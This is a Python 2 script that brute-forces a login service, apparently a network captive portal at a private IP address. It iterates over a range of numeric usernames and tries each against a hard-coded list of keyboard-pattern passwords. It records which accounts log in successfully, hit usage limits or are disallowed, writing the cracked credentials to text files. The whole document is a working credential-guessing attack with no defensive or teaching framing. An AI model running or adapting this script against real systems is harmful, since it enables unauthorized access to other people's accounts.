import urllib
import time
import datetime
import urllib2
import sys
import xml.dom.minidom as XML
#16101001
#16803030

	
def fun():

	start=16102001
	end=161012243																																																																																								
	
	password=['11qq22', '11qq33', '11ww22', '11ww33', '11ee22', '11ee33', '22qq11', '22qq33', '22ww11', '22ww33', '22ww44', '22ee11', '22ee33', '22ee44', '22rr33', '22rr44', '33qq11', '33qq22', '33ww11', '33ww22', '33ww44', '33ee11', '33ee22', '33ee44', '33ee55', '33rr22', '33rr44', '33rr55', '33tt44', '33tt55', '44ww22', '44ww33', '44ee22', '44ee33', '44ee55', '44rr22', '44rr33', '44rr55', '44rr66', '44tt33', '44tt55', '44tt66', '44yy55', '44yy66', '55ee33', '55ee44', '55rr33', '55rr44', '55rr66', '55tt33', '55tt44', '55tt66', '55tt77', '55yy44', '55yy66', '55yy77', '55uu66', '55uu77', '66rr44', '66rr55', '66tt44', '66tt55', '66tt77', '66yy44', '66yy55', '66yy77', '66yy88', '66uu55', '66uu77', '66uu88', '66ii77', '66ii88', '77tt55', '77tt66', '77yy55', '77yy66', '77yy88', '77uu55', '77uu66', '77uu88', '77uu99', '77ii66', '77ii88', '77ii99', '77oo88', '77oo99', '88yy66', '88yy77', '88uu66', '88uu77', '88uu99', '88ii66', '88ii77', '88ii99', '88ii00', '88oo77', '88oo99', '88oo00', '88pp99', '88pp00', '99uu77', '99uu88', '99ii77', '99ii88', '99ii00', '99oo77', '99oo88', '99oo00', '99pp88', '99pp00', '00ii88', '00ii99', '00oo88', '00oo99', '00pp88', '00pp99', 'qq11ww', 'qq11ee', 'qq22ww', 'qq22ee', 'qq33ww', 'qq33ee', 'ww11qq', 'ww11ee', 'ww22qq', 'ww22ee', 'ww22rr', 'ww33qq', 'ww33ee', 'ww33rr', 'ww44ee', 'ww44rr', 'ee11qq', 'ee11ww', 'ee22qq', 'ee22ww', 'ee22rr', 'ee33qq', 'ee33ww', 'ee33rr', 'ee33tt', 'ee44ww', 'ee44rr', 'ee44tt', 'ee55rr', 'ee55tt', 'rr22ww', 'rr22ee', 'rr33ww', 'rr33ee', 'rr33tt', 'rr44ww', 'rr44ee', 'rr44tt', 'rr44yy', 'rr55ee', 'rr55tt', 'rr55yy', 'rr66tt', 'rr66yy', 'tt33ee', 'tt33rr', 'tt44ee', 'tt44rr', 'tt44yy', 'tt55ee', 'tt55rr', 'tt55yy', 'tt55uu', 'tt66rr', 'tt66yy', 'tt66uu', 'tt77yy', 'tt77uu', 'yy44rr', 'yy44tt', 'yy55rr', 'yy55tt', 'yy55uu', 'yy66rr', 'yy66tt', 'yy66uu', 'yy66ii', 'yy77tt', 'yy77uu', 'yy77ii', 'yy88uu', 'yy88ii', 'uu55tt', 'uu55yy', 'uu66tt', 'uu66yy', 'uu66ii', 'uu77tt', 'uu77yy', 'uu77ii', 'uu77oo', 'uu88yy', 'uu88ii', 'uu88oo', 'uu99ii', 'uu99oo', 'ii66yy', 'ii66uu', 'ii77yy', 'ii77uu', 'ii77oo', 'ii88yy', 'ii88uu', 'ii88oo', 'ii88pp', 'ii99uu', 'ii99oo', 'ii99pp', 'ii00oo', 'ii00pp', 'oo77uu', 'oo77ii', 'oo88uu', 'oo88ii', 'oo88pp', 'oo99uu', 'oo99ii', 'oo99pp', 'oo00ii', 'oo00pp', 'pp88ii', 'pp88oo', 'pp99ii', 'pp99oo', 'pp00ii', 'pp00oo']	
	day = open("day.txt", "a")
	hos = open("hos.txt", "a")
	op = open("open.txt", "a")
	passes=open("passes.txt", "a")
	passes.write("[")
	url = 'http://172.16.68.6:8090/httpclient.html'
	#username=''
	#password=''
	for username in range(start, end):
		username=str(username)
		for pass1 in password:
			post_data = 'mode=191' + '&username=' + username + '&password=' + pass1
			req = urllib2.Request(url, post_data)
			response = urllib2.urlopen(req)
			xml_dom = XML.parseString(response.read())
			document = xml_dom.documentElement
			response = document.getElementsByTagName('message')[0].childNodes[0].nodeValue
			#print response
			kk="\n"+username +" "+ pass1+"\n"
				
			if 'successfully' in response:
				print 'sucess', username, pass1
				hos.write(kk)
				op.write(kk)
				passes.write(pass1+", ")
				break;
			elif 'Limit' in response:
				print 'limit'
			    #kk=username , password
				hos.write(kk)

				passes.write(pass1+", ")
				break;
			elif 'allowed' in response:
				print 'not allowed'
				#kk=username , password
				day.write(kk)    

				passes.write(pass1+", ")
				break;
			elif 'data' in response:
				print 'data'
			    #kk=username , password
				hos.write(kk)

				passes.write(pass1+", ")
				break;

	passes.write("]")
	passes.close()
	op.close()
	hos.close()
	day.close()

if __name__ == '__main__':
	#password=['77uu88', 'ii9988']
	fun()



